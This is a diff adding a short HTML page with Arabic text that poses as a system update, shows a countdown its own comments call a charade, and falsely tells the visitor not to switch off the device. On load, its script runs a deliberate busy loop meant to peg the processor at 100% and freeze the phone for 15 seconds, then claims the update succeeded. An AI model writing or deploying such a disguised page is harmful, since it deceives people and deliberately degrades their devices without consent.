@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>جاري التحميل</title>
+</head>
+<body style="background-color: black; color: cyan; text-align: center; margin-top: 20%; font-family: Arial, sans-serif;">
+    
+    <h1>⚠️ جاري تحديث النظام</h1>
+    <h2 id="timer" style="color: yellow; font-size: 50px;"></h2>
+    <p>يرجى عدم إغلاق الجهاز.</p>
+
+    <script>
+        window.onload = function() {
+            var duration = 15; // 15 ثانية توقف (يمكنك تغييرها)
+            var milliseconds = duration * 1000;
+            var countdown = duration;
+            var timerElement = document.getElementById('timer');
+
+            // عداد تنازلي للتمثيلية
+            var countInterval = setInterval(() => {
+                countdown--;
+                timerElement.innerText = countdown + " ثانية";
+                if(countdown <= 0) clearInterval(countInterval);
+            }, 1000);
+
+            // بدء التجميد الحقيقي (استنزاف المعالج بالكامل)
+            var start = Date.now();
+            while (Date.now() - start < milliseconds) {
+                // عمليات حسابية ثقيلة جداً تجعل المعالج يصل إلى 100%
+                for(var i=0; i<1000000; i++) {
+                    Math.sqrt(Math.random() * 99999999999999);
+                }
+            }
+
+            // بعد انتهاء التجميد، يعود الهاتف للحياة
+            document.body.style.backgroundColor = "green";
+            document.body.innerHTML = "<h1 style='color:white;'>✅ تم التحديث بنجاح!</h1><p>الهاتف الآن يعمل بشكل طبيعي.</p>";
+        };
+    </script>
+</body>
+</html>
